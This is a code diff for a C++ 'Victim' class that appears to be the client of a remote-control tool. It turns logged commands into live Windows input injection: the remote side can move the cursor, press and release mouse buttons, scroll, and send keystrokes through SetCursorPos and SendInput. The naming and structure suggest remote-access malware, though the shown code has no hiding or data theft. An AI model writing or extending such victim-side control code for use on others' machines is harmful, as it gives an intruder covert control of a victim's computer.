@@ -2,6 +2,7 @@
 #include <thread>
 #include <iostream>
 #include <SFML/Window.hpp>
+#include <Windows.h>
 #include "../commands.hpp"
 
 Victim::Victim(std::string inHId)
@@ -34,19 +35,19 @@ int Victim::runVictimProcess()
 		//start ssh session
 		if (cmd == uint8_t(Cmd::START_SSH)) {
 			isSshActive = true;
-			std::cout << "code " << int(cmd) << ": start ssh\n";
+			std::cout << "start ssh\n";
 		}
 		//end ssh session
 		else if (cmd == uint8_t(Cmd::END_SSH)) {
 			isSshActive = false;
-			std::cout << "code " << int(cmd) << ": stop ssh\n";
+			std::cout << "stop ssh\n";
 		}
 		//receive ssh data
 		else if (cmd == uint8_t(Cmd::SSH_DATA)) {
 			std::string data;
 			p >> data;
 
-			std::cout << "code " << int(cmd) << ": ssh data #" << data << "#\n";
+			std::cout << "data: #" << data << "#\n";
 
 			std::string resStr = "received and processed #" + data + "#\n";
 			sf::Packet res;
@@ -62,37 +63,101 @@ int Victim::runVictimProcess()
 			int x = std::round((rx * size.x) / float(UINT16_MAX - 1));
 			int y = std::round((ry * size.y) / float(UINT16_MAX - 1));
 
-			std::cout << "mouse " << x << ", " << y << "\n";
+			SetCursorPos(x, y);
 		}
+		//receive mouse button press
 		else if (cmd == uint8_t(Cmd::SSH_MOUSE_PRESS)) {
 			uint8_t i;
 			p >> i;
 
-			std::cout << "mouse press: " << int(i) << "\n";
+			INPUT in;
+			in.type = INPUT_MOUSE;
+			in.mi.time = 0;
+			in.mi.mouseData = 0;
+
+			if (i == 1)
+				in.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
+			else if (i == 2)
+				in.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
+			else if (i == 3)
+				in.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
+			else if (i == 4 || i == 5)
+			{
+				in.mi.dwFlags = MOUSEEVENTF_XDOWN;
+				if (i == 4)
+					in.mi.mouseData = XBUTTON1;
+				else
+					in.mi.mouseData = XBUTTON2;
+			}
+
+			SendInput(1, &in, sizeof(INPUT));
 		}
+		//receive mouse button release
 		else if (cmd == uint8_t(Cmd::SSH_MOUSE_RELEASE)) {
 			uint8_t i;
 			p >> i;
 
-			std::cout << "mouse release: " << int(i) << "\n";
+			INPUT in;
+			in.type = INPUT_MOUSE;
+			in.mi.time = 0;
+			in.mi.mouseData = 0;
+
+			if (i == 1)
+					in.mi.dwFlags = MOUSEEVENTF_LEFTUP;
+			else if (i == 2)
+					in.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
+			else if (i == 3)
+					in.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
+			else if (i == 4 || i == 5)
+			{
+				in.mi.dwFlags = MOUSEEVENTF_XUP;
+				if (i == 4)
+					in.mi.mouseData = XBUTTON1;
+				else
+					in.mi.mouseData = XBUTTON2;
+			}
+
+			SendInput(1, &in, sizeof(INPUT));
 		}
+		//receive mouse wheel scroll
 		else if (cmd == uint8_t(Cmd::SSH_MOUSE_SCROLL)) {
 			int16_t delta;
 			p >> delta;
 
-			std::cout << "mouse scroll: " << delta << "\n";
+			INPUT input;
+			input.type = INPUT_MOUSE;
+			input.mi.dx = 0;
+			input.mi.dy = 0;
+			input.mi.mouseData = delta;
+			input.mi.dwFlags = MOUSEEVENTF_WHEEL;
+			input.mi.time = 0;
+			input.mi.dwExtraInfo = 0;
+
+			SendInput(1, &input, sizeof(INPUT));
 		}
+		//receive keyboard press
 		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD_PRESS)) {
 			uint8_t i;
-			p >> i; 
-			
-			std::cout << "keyboard press: " << int(i) << "\n";
+			p >> i;
+
+			INPUT input;
+			input.type = INPUT_KEYBOARD;
+			input.ki.wVk = i;
+			input.ki.dwFlags = 0;
+
+			SendInput(1, &input, sizeof(INPUT));
 		}
+		//receive keyboard release
 		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD_RELEASE)) {
 			uint8_t i;
 			p >> i;
 
-			std::cout << "keyboard release: " << int(i) << "\n";
+			INPUT input;
+			input.type = INPUT_KEYBOARD;
+			input.ki.wVk = i;
+			input.ki.dwFlags = KEYEVENTF_KEYUP;
+
+			SendInput(1, &input, sizeof(INPUT));
 		}
 		//unknown command
 		else {
